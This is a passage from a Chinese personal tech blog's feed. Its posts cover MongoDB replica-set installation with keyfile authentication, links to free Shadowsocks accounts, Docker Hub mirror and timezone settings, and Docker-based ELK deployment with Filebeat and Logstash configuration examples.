title="1、关闭防火墙"></a>1、关闭防火墙</h3><p>关闭三台机器的防火墙：</p><pre><code class="bash">systemctl stop firewalld.servicesystemctl disable firewalld.service</code></pre><p>注意：如果后面端口还是不通，可以考虑是否是Selinux的影响。</p><h3 id="2、离线安装mongodb"><a href="#2、离线安装mongodb" class="headerlink" title="2、离线安装mongodb"></a>2、离线安装mongodb</h3><p>在三台机器上依次执行安装mongodb的脚本：<code>bash mongo_install.sh</code></p><p>具体脚本信息如下：</p><pre><code class="bash">#!/bin/bashrpm -ivh mongodb-org-server-3.2.1-1.el7.x86_64.rpmrpm -ivh mongodb-org-tools-3.2.1-1.el7.x86_64.rpmrpm -ivh mongodb-org-mongos-3.2.1-1.el7.x86_64.rpmrpm -ivh mongodb-org-shell-3.2.1-1.el7.x86_64.rpmrpm -ivh mongodb-org-3.2.1-1.el7.x86_64.rpmsystemctl start mongodEXCODE=$?if [ &quot;$EXCODE&quot; == &quot;0&quot; ]; then    echo &#39;-------------------------------------&#39;    echo &#39;Mongo install Sucess!&#39;    echo &#39;-------------------------------------&#39;fisystemctl status mongod</code></pre><p><strong>注意：因我司机房环境特殊，无法连通外网，故使用rpm包形式进行安装。同时也解决了tar包启动中要创建用户、注册为服务、设置开机启动的繁琐事项。如果可以访问外网，也可以使用yum在线安装。</strong></p></li></ol><h2 id="三、集群配置"><a href="#三、集群配置" class="headerlink" title="三、集群配置"></a>三、集群配置</h2><h3 id="1、生成密钥文件"><a href="#1、生成密钥文件" class="headerlink" title="1、生成密钥文件"></a>1、生成密钥文件</h3><p>第一台主机上执行：</p><pre><code class="bash">openssl rand -base64 756 &gt; /var/lib/mongo/keyFilechmod 600 /var/lib/mongo/keyFilechown -R mongod:mongod /var/lib/mongo/keyFile</code></pre><p>其他两台主机复制第一台生成的keyFile文件(通过lszrz 或者 scp 或者 ftp)，并执行以下命令：</p><pre><code class="bash">cp keyFile /var/lib/mongo/chmod 600 /var/lib/mongo/keyFilechown -R mongod:mongod /var/lib/mongo/keyFile</code></pre><h3 id="2、修改监听，配置集群名称"><a href="#2、修改监听，配置集群名称" class="headerlink" title="2、修改监听，配置集群名称"></a>2、修改监听，配置集群名称</h3><p><strong>三台机器依次做如下操作</strong></p><h4 id="1）修改监听："><a href="#1）修改监听：" class="headerlink" title="1）修改监听："></a>1）修改监听：</h4><p><code>sed -i &quot;s/bindIp: 127.0.0.1/bindIp: 0.0.0.0/g&quot; /etc/mongod.conf </code></p><h4 id="2）配置集群名称："><a href="#2）配置集群名称：" class="headerlink" title="2）配置集群名称："></a>2）配置集群名称：</h4><pre><code class="bassh">cat &gt;&gt; /etc/mongod.conf &lt;&lt; EOFreplication:  oplogSizeMB: 1024   replSetName: marsEOF</code></pre><p><strong>右上角bash复制代码存在bug，会去除缩进。请尽量使用鼠标右键复制。</strong></p><h4 id="3）重启"><a href="#3）重启" class="headerlink" title="3）重启"></a>3）重启</h4><p>三台机器依次重启服务：</p><p><code>systemctl restart mongod</code></p><h3 id="3、初始化集群"><a href="#3、初始化集群" class="headerlink" title="3、初始化集群"></a>3、初始化集群</h3><p>在第一台主机上，执行<code>mongo</code>命令，进入mongo shell：</p><pre><code class="bash">use admin# 设置集群配置（根据具体情况修改IP和端口）config = &#123;_id:&quot;mars&quot;,members:[&#123;_id:0,host:&#39;172.16.20.29:27017&#39;,priority :100&#125;,&#123;_id:1,host:&#39;172.16.20.30:27017&#39;,priority:100&#125;,&#123;_id:2,host:&#39;172.16.20.31:27017&#39;,priority:100&#125;]&#125;# 初始化集群rs.initiate(config)# 查看集群状态rs.status()</code></pre><h2 id="二、认证配置"><a href="#二、认证配置" class="headerlink" title="二、认证配置"></a>二、认证配置</h2><h3 id="1、创建用户"><a href="#1、创建用户" class="headerlink" title="1、创建用户"></a>1、创建用户</h3><p><strong>在第一台机器上</strong></p><p>在mongo shell中输入：</p><p><strong>创建管理员账户：</strong></p><p><code>db.createUser(&#123;user: &quot;admin&quot;,pwd: &quot;xxxxxx&quot;,roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125;,&#123; role: &quot;clusterAdmin&quot;, db: &quot;admin&quot; &#125;]&#125;)</code></p><p><strong>创建客户端账户:</strong></p><p><code>db.createUser(&#123;user: &quot;用于客户端用户名&quot;,pwd: &quot;用于客户端密码&quot;,roles: [ &quot;readWriteAnyDatabase&quot;]&#125;)</code></p><p><strong>退出mongo shell：</strong><code>exit</code></p><h3 id="2、开启认证"><a href="#2、开启认证" class="headerlink" title="2、开启认证"></a>2、开启认证</h3><p><strong>在所有三台机器上</strong></p><p>在shell终端中输入：</p><pre><code class="bash">cat &gt;&gt; /etc/mongod.conf &lt;&lt; EOFsecurity:  authorization: enabled  keyFile: /var/lib/mongo/keyFileEOF</code></pre><h3 id="3、重启"><a href="#3、重启" class="headerlink" title="3、重启"></a>3、重启</h3><p>全部三个几点，一次重启</p><p><code>systemctl restart mongod</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、环境说明&quot;&gt;&lt;a href=&quot;#一、环境说明&quot; class=&quot;headerlink&quot; title=&quot;一、环境说明&quot;&gt;&lt;/a&gt;一、环境说明&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;操作系统：Centos7.6&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Mongodb 3.2.1</summary>
      
    
    
    
    <category term="数据库" scheme="https://www.langxw.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="MongoDB" scheme="https://www.langxw.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/"/>
    
    
    <category term="mongodb" scheme="https://www.langxw.com/tags/mongodb/"/>
    
  </entry>
  
  <entry>
    <title>ss免费账号</title>
    <link href="https://www.langxw.com/2021/02/22/ss%E5%85%8D%E8%B4%B9%E8%B4%A6%E5%8F%B7/"/>
    <id>https://www.langxw.com/2021/02/22/ss%E5%85%8D%E8%B4%B9%E8%B4%A6%E5%8F%B7/</id>
    <published>2021-02-22T07:38:35.000Z</published>
    <updated>2021-03-16T11:58:37.068Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、免费账号"><a href="#一、免费账号" class="headerlink" title="一、免费账号"></a>一、免费账号</h2><p><a href="https://github.com/Alvin9999/new-pac/wiki/ss%E5%85%8D%E8%B4%B9%E8%B4%A6%E5%8F%B7">免费账号连接：https://github.com/Alvin9999/new-pac/wiki/ss%E5%85%8D%E8%B4%B9%E8%B4%A6%E5%8F%B7</a></p><p><strong>账号可能会失效，失效后请到以上页面获取新的账号。</strong></p><h2 id="二、自由上网"><a href="#二、自由上网" class="headerlink" title="二、自由上网"></a>二、自由上网</h2><p><a href="https://github.com/Alvin9999/new-pac/wiki">自由上网：https://github.com/Alvin9999/new-pac/wiki</a></p><h2 id="三、注意事项"><a href="#三、注意事项" class="headerlink" title="三、注意事项"></a>三、注意事项</h2><ol><li>本资源仅供用于学习和交流,请遵循相关法律法规,本资源不代表本站立场,并禁止以下行为</li><li>不得使用 BT，eMule，迅雷，FlashGet，Tor 等 P2P 工具下载非法和国家禁止的互联网信息内容</li><li>不得用于“注册机/发贴机/垃圾邮件/群发外链/黑帽SEO/网络攻击/网络诈骗”等用途</li><li>不得下载或传播侵犯知识产权相关内容</li><li>不得发布任何非法、威胁、诽谤、反动、淫秽、色情信息或其它违法信息</li><li>不得利用本系统可能存在漏洞以各种形式为自己及他人牟利</li><li>不散布电子邮件广告、垃圾邮件（SPAM）：不利用本平台提供的服务散发大量不受欢迎的或者未经请求的电子邮件、电子广告或包含反动、色情等有害信息的电子邮件</li><li>不利用本平台提供的服务上传、下载、发布如下信息或者内容，不为他人发布该等信息提供任何便利</li><li>违反国家规定的政治宣传或新闻信息</li><li>涉及国家秘密或安全的信息</li><li>封建迷信或淫秽、色情、下流的信息或教唆犯罪的信息</li><li>违反国家民族和宗教政策的信息</li><li>妨碍互联网运行安全的信息</li><li>侵害他人合法权益的信息或其他有损于社会秩序、社会治安、公共道德的信息或内容</li><li>其他违反法律法规、部门规章或国家政策的内容</li><li>不进行任何破坏或试图破坏网络安全的行为（包括钓鱼，黑客，网络诈骗等）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、免费账号&quot;&gt;&lt;a href=&quot;#一、免费账号&quot; class=&quot;headerlink&quot; title=&quot;一、免费账号&quot;&gt;&lt;/a&gt;一、免费账号&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Alvin9999/new-pac/wiki/ss%</summary>
      
    
    
    
    <category term="工具" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="翻墙" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/%E7%BF%BB%E5%A2%99/"/>
    
    
    <category term="shadowsocks" scheme="https://www.langxw.com/tags/shadowsocks/"/>
    
  </entry>
  
  <entry>
    <title>DockerHub加速</title>
    <link href="https://www.langxw.com/2021/02/02/DockerHub%E5%8A%A0%E9%80%9F/"/>
    <id>https://www.langxw.com/2021/02/02/DockerHub%E5%8A%A0%E9%80%9F/</id>
    <published>2021-02-02T02:34:29.000Z</published>
    <updated>2021-02-02T02:35:58.143Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、缘由："><a href="#一、缘由：" class="headerlink" title="一、缘由："></a>一、缘由：</h2><p>　　今天学习Flask，书上建议用Docker，那我就安装了DockerToolBox（WIN10系统只能用toolbox）。其中从docker hub拉取ubuntu镜像时</p><p>docker pull xxxx，网速简直是龟速。想到中国的长城防火墙，再想到毕竟是国外的网站，瞬间心灰意冷，想诅骂作者搞了个那么大个镜像在Docker Hub。</p><p>　　按以往的经验，对于国外网站或者源，我们都喜欢更换国内源、使用代理VPN、使用加速器，来解决访问不了或者访问慢的问题。</p><p><strong>环境：WIN 10  ；Docker 17</strong></p><h2 id="二、解决办法："><a href="#二、解决办法：" class="headerlink" title="二、解决办法："></a>二、解决办法：</h2><p>　　<strong>Docker加速器 DaoCloud</strong></p><p>　　DaoCloud 加速器 是广受欢迎的 Docker 工具，解决了国内用户访问 Docker Hub 缓慢的问题。DaoCloud 加速器结合国内的 CDN 服务与协议层优化，成倍的提升了下载速度。</p><p>　　<a href="https://www.daocloud.io/">https://www.daocloud.io/</a> 注册并登陆，在dashboard右上角有一个火箭图标，他就是加速器。点开后获得加速地址：<a href="http://xxxx.m.daocloud.io.(请注意自己的宿主机操作系统,不要选错加速地址)/">http://xxxx.m.daocloud.io。（请注意自己的宿主机操作系统，不要选错加速地址）</a></p><p>　　下面就是将加速地址加入docker的配置文件里，重启docker即可。</p><p>　　我用的是Docker Toolbox，启动Docker Quickstart Terminal，然后按如下步骤操作：</p><pre><code class="bash">docker-machine ssh defaultsudo sed -i &quot;s|EXTRA_ARGS=&#39;|EXTRA_ARGS=&#39;--registry-mirror=加速地址 |g&quot; /var/lib/boot2docker/profileexitdocker-machine restart default </code></pre><p>之后就可以飞速的下载Docker镜像了，O(∩_∩)O哈哈~。</p><p>　　不同的操作系统，不同的docker版本，使用docker加速器配置方法不同，具体请参考官方文档。</p><p>　　<strong>或者使用，阿里云加速器</strong></p><h2 id="三、附件："><a href="#三、附件：" class="headerlink" title="三、附件："></a>三、附件：</h2><p>1、<a href="http://guide.daocloud.io/dcs/daocloud-9153151.html">Docker 加速器官方文档</a></p><p>2、Docker加速器简介：</p><p>Docker加速器是 DaoCloud 推出的 Docker Hub Mirror 服务的官方名称。</p><p>Docker加速器提供Docker Registry（Docker Hub）在中国的镜像代理服务，为中国用户在国内服务器上缓存诸多镜像。</p><p>当用户的Docker设定了–registry-mirror参数后，用户的Docker拉取镜像时，首先去Docker加速器中查找镜像，若命中则说明该镜像已经在Docker加速器中缓存，用户直接从Docker加速器中下载。</p><p>若没有命中，则说该镜像还没有被缓存，那么Docker加速器首先会被驱使去Docker Hub中下载该镜像，并进行缓存，最终让用户从Docker加速器中下载该镜像。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、缘由：&quot;&gt;&lt;a href=&quot;#一、缘由：&quot; class=&quot;headerlink&quot; title=&quot;一、缘由：&quot;&gt;&lt;/a&gt;一、缘由：&lt;/h2&gt;&lt;p&gt;　　今天学习Flask，书上建议用Docker，那我就安装了DockerToolBox（WIN10系统只能用tool</summary>
      
    
    
    
    <category term="虚拟化" scheme="https://www.langxw.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Docker" scheme="https://www.langxw.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/Docker/"/>
    
    
    <category term="docker" scheme="https://www.langxw.com/tags/docker/"/>
    
    <category term="加速器" scheme="https://www.langxw.com/tags/%E5%8A%A0%E9%80%9F%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Docker修改默认时区</title>
    <link href="https://www.langxw.com/2021/02/02/Docker%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E6%97%B6%E5%8C%BA/"/>
    <id>https://www.langxw.com/2021/02/02/Docker%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E6%97%B6%E5%8C%BA/</id>
    <published>2021-02-02T02:32:07.000Z</published>
    <updated>2021-02-02T02:43:52.169Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、缘由："><a href="#一、缘由：" class="headerlink" title="一、缘由："></a>一、缘由：</h2><p><strong>Docker Hub中的镜像默认都是0时区，而我们在东八区，差8小时，会导致我们看日志不能准确定位时间，这是很要命的。</strong></p><h2 id="二、解决办法："><a href="#二、解决办法：" class="headerlink" title="二、解决办法："></a>二、解决办法：</h2><h3 id="1、环境变量方式："><a href="#1、环境变量方式：" class="headerlink" title="1、环境变量方式："></a>1、环境变量方式：</h3><ol><li><p>docker run 启动时加入环境变量：<code>docker run -e &quot;TZ=Asia/Shanghai&quot;</code></p></li><li><p>docker-compose 方式启动时，加入 </p><pre><code class="bash">environment: - TZ=Asia/Shanghai</code></pre><h3 id="2、重新制作镜像方式："><a href="#2、重新制作镜像方式：" class="headerlink" title="2、重新制作镜像方式："></a>2、重新制作镜像方式：</h3></li></ol><p>如果你是基于某个官方Image来制作自己的镜像，比如Alpine。那么你可以在Dockerfile中，加入:</p><pre><code class="bash">RUN apk --no-cache add tzdata  &amp;&amp; \  ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime &amp;&amp; \  echo &quot;Asia/Shanghai&quot; &gt; /etc/timezone</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、缘由：&quot;&gt;&lt;a href=&quot;#一、缘由：&quot; class=&quot;headerlink&quot; title=&quot;一、缘由：&quot;&gt;&lt;/a&gt;一、缘由：&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Docker Hub中的镜像默认都是0时区，而我们在东八区，差8小时，会导致我们看日志不能准确定位时</summary>
      
    
    
    
    <category term="虚拟化" scheme="https://www.langxw.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Docker" scheme="https://www.langxw.com/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/Docker/"/>
    
    
    <category term="docker" scheme="https://www.langxw.com/tags/docker/"/>
    
    <category term="timezone" scheme="https://www.langxw.com/tags/timezone/"/>
    
  </entry>
  
  <entry>
    <title>ELK-Docker化安装</title>
    <link href="https://www.langxw.com/2021/02/02/ELK-Docker%E5%8C%96%E5%AE%89%E8%A3%85/"/>
    <id>https://www.langxw.com/2021/02/02/ELK-Docker%E5%8C%96%E5%AE%89%E8%A3%85/</id>
    <published>2021-02-02T02:28:20.000Z</published>
    <updated>2021-02-02T02:31:38.026Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、环境："><a href="#一、环境：" class="headerlink" title="一、环境："></a>一、环境：</h2><p><strong>Ubuntu18.04 + Docker 18.09 + ELK Docker Image 7.1</strong> </p><h2 id="二、安装部署："><a href="#二、安装部署：" class="headerlink" title="二、安装部署："></a>二、安装部署：</h2><h3 id="1、Docker"><a href="#1、Docker" class="headerlink" title="1、Docker"></a>1、Docker</h3><pre><code class="bash">curl -fsSL https://get.docker.com -o get-docker.shsudo sh get-docker.shsudo usermod -aG docker $(whoami)sudo systemctl start dockersudo systemctl status docker</code></pre><h3 id="2、Elasticsearch"><a href="#2、Elasticsearch" class="headerlink" title="2、Elasticsearch"></a>2、Elasticsearch</h3><pre><code class="bash">docker pull docker.elastic.co/elasticsearch/elasticsearch:7.1.0sudo apt install docker-composesudo bash -c &quot;echo &#39;vm.max_map_count=262144&#39; &gt;&gt; /etc/sysctl.conf&quot;sudo sysctl -psudo mkdir -p /data/elasticsearch/datasudo vim docker-compose.ymlsudo chown -R yimi.yimi  elasticsearch/sudo docker-compose up -ddocker ps -acurl http://127.0.0.1:9200/_cat/healthdocker-compose down -v</code></pre><h3 id="3、Kibana"><a href="#3、Kibana" class="headerlink" title="3、Kibana"></a>3、Kibana</h3><pre><code class="bash">docker pull docker.elastic.co/kibana/kibana:7.1.0sudo mkdir /data/kibanasudo vim docker-compose.ymlsudo docker-compose  up -ddocker logs kibana </code></pre><h3 id="4、Logstash"><a href="#4、Logstash" class="headerlink" title="4、Logstash"></a>4、Logstash</h3><pre><code>docker pull docker.elastic.co/logstash/logstash:7.1.0docker run -it --rm docker.elastic.co/logstash/logstash:7.1.0 -e &#39;input &#123; stdin &#123; &#125; &#125; output &#123; stdout &#123; &#125; &#125;&#39;sudo mkdir /data/logstash/sudo chown -R yimi.yimi logstash/docker run -d -p 5044:5044 --name logstash --network elasticsearch_esnet \-v /data/logstash/logstash.conf:/usr/share/logstash/pipeline/logstash.conf \-v /data/logstash/logstash.yml:/usr/share/logstash/config/logstash.yml \docker.elastic.co/logstash/logstash:7.1.0</code></pre><h3 id="5、Filebeat"><a href="#5、Filebeat" class="headerlink" title="5、Filebeat"></a>5、Filebeat</h3><h4 id="1）非Docker模式："><a href="#1）非Docker模式：" class="headerlink" title="1）非Docker模式："></a>1）非Docker模式：</h4><pre><code class="bash"># 1.edit config with logstash # 2.Index setup filebeat setup --template -E output.logstash.enabled=false -E &#39;output.elasticsearch.hosts=[&quot;http://10.15.1.27:9200&quot;]&#39;# 3.kibana setupfilebeat setup -e \  -E output.logstash.enabled=false \  -E output.elasticsearch.hosts=[&#39;http://10.15.1.27:9200&#39;] \  -E setup.kibana.host=http://10.15.1.27:5601  # 4.startup filebeat:sudo service filebeat start</code></pre><p>####2）Docker模式：</p><pre><code class="bash">docker run \docker.elastic.co/beats/filebeat:7.1.1 \setup -E setup.kibana.host=kibana:5601 \-E output.elasticsearch.hosts=[&quot;elasticsearch:9200&quot;]docker run docker.elastic.co/beats/filebeat:7.1.1 setup \--network elasticsearch_esnet --template -E output.logstash.enabled=false \-E &#39;output.elasticsearch.hosts=[&quot;es01:9200&quot;]&#39;docker run --net=&quot;host&quot; docker.elastic.co/beats/filebeat:7.1.1 setup -e \  -E output.logstash.enabled=false \  -E output.elasticsearch.hosts=[&#39;localhost:9200&#39;] \  -E output.elasticsearch.username=filebeat_internal \  -E output.elasticsearch.password=YOUR_PASSWORD \  -E setup.kibana.host=localhost:5601</code></pre><h3 id="6、X-PACK"><a href="#6、X-PACK" class="headerlink" title="6、X-PACK"></a>6、X-PACK</h3><p>x-pack是elasticsearch的一个扩展包，将安全，警告，监视，图形和报告功能捆绑在一个易于安装的软件包中。 </p><p>因为x-pack是收费的，所以试用期只有一个月。长期使用就必须根据官网文档说得来，也是给我们后门，一年一年的续期。</p><p><strong>如果要认证，建议用Nginx做反向代理+认证</strong></p><h2 id="三、ELK-使用步骤："><a href="#三、ELK-使用步骤：" class="headerlink" title="三、ELK 使用步骤："></a>三、ELK 使用步骤：</h2><p>Spring Boot 日志输出到指定目录，Filebeat 进行采集，Logstash 进行过滤，Elasticsearch 进行存储，Kibana 进行展示。</p><p>Filebeat 示例配置（<code>vi /etc/filebeat/filebeat.yml</code>）：</p><pre><code class="yaml">filebeat.prospectors:- input_type: log  paths:    - /var/log/spring-boot-log4j2/*.log  document_type: &quot;spring-boot-log4j2&quot; # 定义写入 ES 时的 _type 值  multiline:    #pattern: &#39;^\s*(\d&#123;4&#125;|\d&#123;2&#125;)\-(\d&#123;2&#125;|[a-zA-Z]&#123;3&#125;)\-(\d&#123;2&#125;|\d&#123;4&#125;)&#39;   # 指定匹配的表达式（匹配以 2017-11-15 08:04:23:889 时间格式开头的字符串）    pattern: &#39;^\s*(&quot;&#123;)&#39;                         # 指定匹配的表达式（匹配以 &quot;&#123; 开头的字符串）    negate: true                                # 是否匹配到    match: after                                # 合并到上一行的末尾    max_lines: 1000                             # 最大的行数    timeout: 30s                                # 如果在规定的时候没有新的日志事件就不等待后面的日志  fields:    logsource: node1    logtype: spring-boot-log4j2- input_type: log  paths:    - /var/log/messages    #- /var/log/*.log  document_type: &quot;syslog&quot; # 定义写入 ES 时的 _type 值  fields:    logsource: node1    logtype: syslog#output.elasticsearch:  #hosts: [&quot;node1:9200&quot;]output.logstash:  hosts: [&quot;node1:10515&quot;]</code></pre><p>上面的配置需要注意几点：</p><ul><li><code>pattern</code>：配置的正则表达式，是为了合并异常信息（而不是单行显示），匹配以<code>&quot;&#123;</code>开头的字符串（判断是否 Json 格式），如果匹配不到的话，就进行合并行。</li><li><code>document_type</code>：配置的是 Elasticsearch 的 Type 值，方便 Elasticsearch 对日志数据的归类。</li><li><code>logtype</code>：新增的字段，用于 Filebeat 和 Logstash 之间传递参数，进行过滤的判断逻辑。</li></ul><p>Logstash 示例配置（<code>vi /etc/logstash/conf.d/logstash.conf</code>）：</p><pre><code class="yaml">input &#123; beats &#123;   port =&gt; 10515  &#125;&#125;filter &#123;  if [fields][logtype] == &quot;syslog&quot; &#123;    grok &#123;      match =&gt; &#123; &quot;message&quot; =&gt; &quot;%&#123;SYSLOGTIMESTAMP:syslog_timestamp&#125; %&#123;SYSLOGHOST:syslog_hostname&#125; %&#123;DATA:syslog_program&#125;(?:\[%&#123;POSINT:syslog_pid&#125;\])?: %&#123;GREEDYDATA:syslog_message&#125;&quot;       add_field =&gt; [ &quot;received_at&quot;, &quot;%&#123;@timestamp&#125;&quot; ]      add_field =&gt; [ &quot;received_from&quot;, &quot;%&#123;host&#125;&quot; ]    &#125;    syslog_pri &#123; &#125;    date &#123;      match =&gt; [ &quot;syslog_timestamp&quot;, &quot;MMM  d HH:mm:ss&quot;, &quot;MMM dd HH:mm:ss&quot; ]    &#125;  &#125;  if [fields][logtype] == &quot;spring-boot-log4j2&quot; &#123;    json &#123;      source =&gt; &quot;message&quot;      target =&gt; &quot;data&quot;    &#125;  &#125;&#125;output &#123;  if [fields][logtype] == &quot;spring-boot-log4j2&quot;&#123;    elasticsearch &#123;      hosts =&gt; [&quot;127.0.0.1:9200&quot;]      index =&gt; &quot;spring-boot-log4j2-%&#123;+YYYY.MM.dd&#125;&quot;    &#125;  &#125;    if [fields][logtype] == &quot;syslog&quot;&#123;    elasticsearch &#123;      hosts =&gt; [&quot;127.0.0.1:9200&quot;]      index =&gt; &quot;filebeat-%&#123;+YYYY.MM.dd&#125;&quot;    &#125;  &#125;&#125;</code></pre><p>上面的配置需要注意几点：</p><ul><li>logstash.conf：配置文件可以配置多个，<code>input</code>、<code>filter</code>和<code>output</code>可以单独文件配置。</li><li>fields logtype：就是上面 Filebeat 配置的字段，这边用来判断服务来源，然后进行单独的处理。</li><li>filter：过滤器做了两件事，一个是使用<code>grok</code>插件，匹配数据和增加字段值，另一个就是使用<code>json</code>插件，将字符串转换成 Json 对象（会创建<code>data</code>层级结构，如果不想新建层级的话，删掉<code>target</code>配置即可）。</li><li>output：根据<code>logtype</code>判断，输出到指定的 Elasticsearch 地址，以及创建指定的索引。</li></ul><p>简单总结下， Filebeat 是客户端，一般部署在 Service 所在服务器（有多少服务器，就有多少 Filebeat），不同 Service 配置不同的<code>input_type</code>（也可以配置一个），采集的数据源可以配置多个，然后 Filebeat 将采集的日志数据，传输到指定的 Logstash 进行过滤，最后将处理好的日志数据，存储到指定的 Elasticsearch。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、环境：&quot;&gt;&lt;a href=&quot;#一、环境：&quot; class=&quot;headerlink&quot; title=&quot;一、环境：&quot;&gt;&lt;/a&gt;一、环境：&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Ubuntu18.04 + Docker 18.09 + ELK Docker Image 7.1&lt;</summary>
      
    
    
    
    <category term="工具" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="ELK" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/ELK/"/>
    
    
    <category term="docker" scheme="https://www.langxw.com/tags/docker/"/>
    
    <category term="ELK" scheme="https://www.langxw.com/tags/ELK/"/>
    
  </entry>
  
  <entry>
    <title>ELK自定义索引配置</title>
    <link href="https://www.langxw.com/2021/02/02/ELK%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B4%A2%E5%BC%95%E9%85%8D%E7%BD%AE/"/>
    <id>https://www.langxw.com/2021/02/02/ELK%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B4%A2%E5%BC%95%E9%85%8D%E7%BD%AE/</id>
    <published>2021-02-02T02:26:17.000Z</published>
    <updated>2021-02-02T02:27:57.429Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、缘由："><a href="#一、缘由：" class="headerlink" title="一、缘由："></a>一、缘由：</h2><p>ELK中，如果是你使用Logstash做日志收集Agent，那么默认索引为logstash-<em>；如果你使用Filebeat做日志收集Agent，那么默认索引为filebeat-</em> 。</p><p>默认的索引，不利于我们区分不同的应用日志，所以要自定义索引和应用一一对应，这样才能更清晰快速的检索日志。</p><p><strong>环境：Ubuntu18 + ELK 7.1.0 + Docker， 采用 Filebeat –&gt; Logstash –&gt; Elasticsearch –&gt; Kibana</strong></p><h2 id="二、架构分析："><a href="#二、架构分析：" class="headerlink" title="二、架构分析："></a>二、架构分析：</h2><p>目前知道的架构方式有三种：</p><ol><li>Logstash –&gt; Elasticsearch –&gt; Kibana     弃用</li><li><strong>Filebeat –&gt;  Elasticsearch –&gt; Kibana</strong>       简单需求使用</li><li><strong>Filebeat –&gt; Logstash –&gt; Elasticsearch –&gt; Kibana</strong>    复杂需求使用</li></ol><p>由于Filebeat和Logstash相比，更轻量更节省资源，对采集日志的机器负担最小，Agent目前普遍才用Filebeat（Beat等）。</p><p>故以上第一种架构方式基本被舍弃，如果应用少、采集日志需求简单，直接使用第二种方式；如果应用日志多、需求复杂，则要使用第三种方式。</p><h2 id="三、解决办法："><a href="#三、解决办法：" class="headerlink" title="三、解决办法："></a>三、解决办法：</h2><p>不同的架构方式，自定义配置索引的方式不同。</p><h3 id="1、Filebeat-output-到ES（待验证）："><a href="#1、Filebeat-output-到ES（待验证）：" class="headerlink" title="1、Filebeat output 到ES（待验证）："></a>1、Filebeat output 到ES（待验证）：</h3><p>修改filebeat.yml配置文件</p><pre><code class="yml"># 配置输入filebeat.inputs:- type: log  enabled: true  paths:    - /home/wwwlogs/access.log  json.keys_under_root: true  json.add_error_key: true  fields:    source: &#39;nginx-access&#39;- type: log  enabled: true  paths:    - /home/wwwlogs/kibana.log  json.keys_under_root: true  json.add_error_key: true  fields:    source: &#39;kibana-access&#39;# 配置输出output.elasticsearch:  hosts: [&quot;192.168.0.4:9200&quot;]  indices:    - index: &quot;%&#123;[fields.source]&#125;-%&#123;+yyyy.MM.dd&#125;&quot;      when.contains:        fields.source: &quot;nginx-access&quot;    - index: &quot;%&#123;[fields.source]&#125;-%&#123;+yyyy.MM.dd&#125;&quot;      when.contains:        fields.source: &quot;kibana-access&quot;</code></pre><p>主要是在input那里配置自定义字段fields.source，然后再output es那里使用indices+when，即实现自定义索引。</p><h3 id="2、Filebeat-output-到Logstash（已验证）："><a href="#2、Filebeat-output-到Logstash（已验证）：" class="headerlink" title="2、Filebeat output 到Logstash（已验证）："></a>2、Filebeat output 到Logstash（已验证）：</h3><p>这一个需要filebeat和logstash的配合，索引的自定义在logstash的output完成。</p><h4 id="1）修改filebet的配置"><a href="#1）修改filebet的配置" class="headerlink" title="1）修改filebet的配置"></a>1）修改filebet的配置</h4><p><code>vim filebeat.yml</code></p><pre><code class="yml"># 配置输入filebeat.inputs:- type: log  enabled: true  paths:    - /data/logs/ca/ca.log  fields:    type: &quot;ca&quot;- type: log  enabled: true  paths:    - /data/logs/ws-fund/ws-fund.log  fields:    type: &quot;ws-fund&quot;# 配置输出output.logstash:  hosts: [&quot;192.168.0.4:5044&quot;]</code></pre><h4 id="2）-修改logstash配置"><a href="#2）-修改logstash配置" class="headerlink" title="2） 修改logstash配置"></a>2） 修改logstash配置</h4><p><code>vim logstash.conf</code></p><pre><code class="bash"># 配置输入input &#123;  beats &#123;    port =&gt; 5044  &#125;&#125;# 配置输出output &#123;    if [fields][type] == &quot;ws-fund&quot;&#123;      elasticsearch &#123;        hosts =&gt; [&quot;http://es01:9200&quot;]        index =&gt; &quot;ws-fund-%&#123;+YYYY.MM.dd&#125;&quot;      &#125;    &#125;else if [fields][type] == &quot;ca&quot;&#123;      elasticsearch &#123;        hosts =&gt; [&quot;http://es01:9200&quot;]        index =&gt; &quot;ca-%&#123;+YYYY.MM.dd&#125;&quot;      &#125;    &#125;else &#123;      elasticsearch &#123;        hosts =&gt; [&quot;http://es01:9200&quot;]        index =&gt; &quot;%&#123;[@metadata][beat]&#125;-%&#123;[@metadata][version]&#125;-%&#123;+YYYY.MM.dd&#125;&quot;      &#125;    &#125;&#125;</code></pre>]]></content>
    
    
      
      
